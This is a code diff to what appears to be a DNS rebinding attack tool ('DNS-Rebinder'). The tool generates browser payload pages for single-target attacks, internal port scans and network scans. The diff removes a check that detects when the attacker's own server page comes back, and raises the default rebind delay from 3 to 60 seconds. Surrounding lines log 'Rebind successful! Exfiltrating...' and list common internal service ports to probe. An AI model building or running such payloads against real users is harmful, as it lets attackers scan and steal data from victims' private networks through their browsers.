@@ -177,16 +177,6 @@ class PayloadGenerator:
             
             const data = await resp.text();
             
-            // Check if we got our own server's page back (rebind hasn't happened)
-            // Look for signatures of our payload server
-            const ownPageSignatures = ['Loading Game', 'DNS-Rebinder', 'Unknown payload', 'Payload server', 'Attack URL'];
-            for (const sig of ownPageSignatures) {{
-                if (data.includes(sig)) {{
-                    addLog('Got our own server page back (contains "' + sig + '"), rebind not complete');
-                    return false;
-                }}
-            }}
-            
             addLog('SUCCESS! Got ' + data.length + ' bytes');
             setStatus('🎉 Rebind successful! Exfiltrating...', 'success');
             
@@ -596,7 +586,7 @@ class PayloadPage(resource.Resource):
             # Port auto-detected from URL, fallback to param, fallback to 80
             port = int(args.get('port', 80))  # Only used as JS fallback
             path = args.get('path', '/')
-            delay = int(args.get('delay', 3000))
+            delay = int(args.get('delay', 60000))
             
             html = PayloadGenerator.single_target(
                 domain=domain,
@@ -631,7 +621,7 @@ class PayloadPage(resource.Resource):
             default_ports = '80,443,8080,8443,3000,5000,8000,4200,8888,9000,9090,9200,5601,8081,4443,10000,3001,5001,8001,4000'
             ports_str = args.get('ports', default_ports)
             ports = [int(p) for p in ports_str.split(',')]
-            delay = int(args.get('delay', 3000))
+            delay = int(args.get('delay', 60000))
             
             html = PayloadGenerator.port_scan(
                 domain=domain,
@@ -643,7 +633,7 @@ class PayloadPage(resource.Resource):
             
         elif self.path == 'netscan':
             port = int(args.get('port', 80))
-            delay = int(args.get('delay', 3000))
+            delay = int(args.get('delay', 60000))
             
             html = PayloadGenerator.network_scan(
                 domain=domain,
